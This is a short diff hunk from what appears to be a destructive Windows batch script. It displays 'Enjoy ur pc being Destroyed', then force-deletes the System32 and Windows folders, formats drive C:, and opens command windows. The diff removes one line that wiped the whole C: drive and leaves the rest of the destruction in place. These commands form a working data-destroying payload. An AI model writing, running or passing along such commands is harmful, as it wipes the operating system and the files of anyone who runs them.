@@ -12,7 +12,6 @@ msg * Enjoy ur pc being Destroyed 🙂
 timeout 2
 del C:\Windows\System32 /f /s /q
 del C:\Windows /f /s /q
-del C: /f /s /q
 format C:
 start cmd 
 start cmd
